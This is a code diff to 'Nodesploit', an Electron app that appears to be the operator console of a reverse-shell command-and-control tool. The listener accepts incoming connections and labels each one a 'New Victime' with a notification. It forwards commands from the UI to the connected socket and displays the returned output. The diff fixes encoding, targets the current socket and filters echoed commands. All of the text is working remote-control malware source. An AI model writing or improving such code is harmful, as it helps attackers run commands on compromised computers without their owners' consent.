@@ -4,6 +4,8 @@ import { mainWindow, loadingWindow } from "./window";
 import { nanoid } from "nanoid";
 
 import store from "@/store";
+import { StringDecoder } from "string_decoder";
+import { TextDecoder } from "util";
 
 /**
  * Set `__static` path to static files in production
@@ -98,9 +100,10 @@ class Nodesploit {
     });
 
     this.server.on("connection", (socket) => {
+      socket.setDefaultEncoding('utf8')
+      socket.setEncoding('utf8')
       this.sockets.push(socket);
       socket.id = nanoid(10);
-      socket.setEncoding("utf8");
       console.log(`[💀] New Victime: ${socket.id}`);
       var notif = new Notification({
         title: "Nouvelles connexion !",
@@ -130,13 +133,17 @@ class Nodesploit {
       socket.on("end", () => {
         this.mainWin.webContents.send("slaveQuitted", socket.id);
       });
-
+      var cmd = "";
       ipcMain.on("cmd", (event, res) => {
-        this.sockets[0].write(res.trim() + "\n");
+        cmd = res.trim() + "\n";
+        socket.write(res.trim() + "\n");
       });
 
       socket.on("data", (data) => {
-        this.mainWin.webContents.send("datarec", data.toString("utf8"));
+        console.log(data.toString('utf8'))
+        if (cmd !== data) {
+          this.mainWin.webContents.send("datarec", data.toString('utf8'));
+         }
       });
     });
 
